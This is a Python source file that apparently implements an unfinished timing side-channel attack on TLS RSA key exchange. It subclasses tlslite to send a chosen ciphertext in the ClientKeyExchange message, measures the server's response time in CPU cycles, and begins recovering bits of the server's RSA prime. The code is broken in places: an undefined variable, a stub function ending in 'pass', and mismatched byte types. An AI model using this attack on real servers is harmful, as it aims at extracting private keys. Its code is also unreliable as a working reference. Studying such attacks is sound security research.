import socket
import tlslite
import rdtsc
import sympy
import sample


from tlslite.handshakesettings import HandshakeSettings


class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
    def __init__(self, cipherSuite, clientHello, serverHello, privateKey, g):
        super(RSAKeyExchangeAttack, self).__init__(
            cipherSuite, clientHello, serverHello, privateKey
        )
        self.g = g

    def processServerKeyExchange(self, srvPublicKey, serverKeyExchange):
        """Generate premaster secret for server"""
        g_bytes = sympy_integer_to_bytes(self.g)
        self.encPremasterSecret = g_bytes
        return g_bytes


class AttackTLSConnection(tlslite.TLSConnection):
    """
    Modified version of tlslite.TLSConnection which replaces the handshake
    function with one that sends a predetermined ciphertext, g, instead of
    the ClientKeyExchange message.

    It also measures the CPU clock cycles taken for the server to
    respond and returns this value to the caller of
    performHandshakeAttack().
    """

    def performHandshakeAttack(self, g):
        # This function starts a handshake with its server, sending
        # the <g> instead of the random number in the
        # ClientKeyExchange message.

        # Setup connection object as a client about to start a handshake:
        self._handshakeStart(client=True)

        settings = HandshakeSettings()
        settings = settings.validate()

        self.version = settings.maxVersion

        # TLS handshake/dance:
        # -> ClientHello

        # Defaults from TLSConnection._handshakeClientAsync()
        srpUsername = None
        reqTack = True
        nextProtos = None
        serverName = None
        extensions = None

        # getCertSuites() returns the "plain" RSA cipher suits.
        cipherSuites = tlslite.constants.CipherSuite.getCertSuites(settings)
        certificateTypes = settings.getCertificateTypes()

        # Construct message, then send
        clientHello = tlslite.messages.ClientHello()
        clientHello.create(
            settings.maxVersion,
            tlslite.utils.cryptomath.getRandomBytes(32),
            bytearray(0),
            cipherSuites,
            certificateTypes,
            srpUsername,
            reqTack,
            nextProtos is not None,
            serverName,
            extensions=extensions,
        )

        for _ in self._sendMsg(clientHello):
            pass

        # <- ServerHello
        # <- Certificate
        # <- ServerHelloDone
        for serverHello in self._getMsg(
            tlslite.constants.ContentType.handshake,
            tlslite.constants.HandshakeType.server_hello,
        ):
            pass

        self.version = serverHello.server_version

        if serverHello.cipher_suite not in cipherSuites:
            raise Exception("Server responded with incorrect ciphersuite")
        cipherSuite = serverHello.cipher_suite

        if serverHello.certificate_type not in clientHello.certificate_types:
            raise Exception("Server responded with incorrect certificate type")

        # -> ClientKeyExchange
        # Start the process as normal...
        clientCertChain = None
        privateKey = None

        # <naughty code>
        keyExchange = RSAKeyExchangeAttack(
            cipherSuite, clientHello, serverHello, None, g
        )
        # </naughty code>

        # Start time
        start_time = rdtsc.get_cycles()

        # Continue the process as normal...
        for result in self._clientKeyExchange(
            settings,
            cipherSuite,
            clientCertChain,
            privateKey,
            serverHello.certificate_type,
            serverHello.tackExt,
            clientHello.random,
            serverHello.random,
            keyExchange,
        ):
            pass

        premasterSecret, serverCertChain, clientCertChain, tackExt = result

        try:
            for result in self._clientFinished(
                premasterSecret,
                clientHello.random,
                serverHello.random,
                cipherSuite,
                settings.cipherImplementations,
                None,
            ):
                pass

            masterSecret = result

            return False

        except tlslite.errors.TLSRemoteAlert:
            end_time = rdtsc.get_cycles()
            return start_time, end_time


def sympy_integer_to_bits(integer, byteorder="big"):
    bits = []

    reduced = integer
    while reduced > 0:
        bits.append(reduced % 2)
        reduced = reduced // 2

    if byteorder == "big":
        bits.reverse()

    return bits


def sympy_integer_to_bytes(integer, byteorder="big"):
    bys = []

    reduced = integer
    while reduced > 0:
        bys.append(reduced % 256)
        reduced = reduced // 256

    if byteorder == "big":
        bys.reverse()

    return bys


def bits_to_sympy_integer(bits, byteorder="big"):
    num_bits = len(bits)

    integer = sympy.Integer(0)

    for index, bit in enumerate(bits):
        if byteorder == "big":
            power = num_bits - index - 1
        elif byteorder == "little":
            power = index
        else:
            raise Exception()

        integer += bit * 2 ** power

    return integer


def bruteforce_most_significant_bits():
    gs = []
    for h in (0, 1):
        for i in (0, 1):
            for j in (0, 1):
                for k in (0, 1):
                    g = bits_to_sympy_integer([h, i, j, k] + [0] * 509)
                    gs.append(g)

    sample.sample(gs, 5000)


def recover_bit(known_q_bits, total_bits, N):
    i = len(known_q_bits) + 1

    num_bits_left = total_bits - (i + 1)
    g_bits = known_q_bits + bytearray([0] * num_bits_left)

    g_high_bits = g_bits
    g_high_bits[i] = 1

    g = bits_to_sympy_integer(g_bits)
    g_high = bits_to_sympy_integer(g_high)

    # if q[i] == 1 then: g < g_high < q
    # else:              g < q < g_high
    R = sympy.Integer(2) ** 512
    u_g = (g * R ** (-1)) % N
    pass


if __name__ == "__main__":
    bruteforce_most_significant_bits()
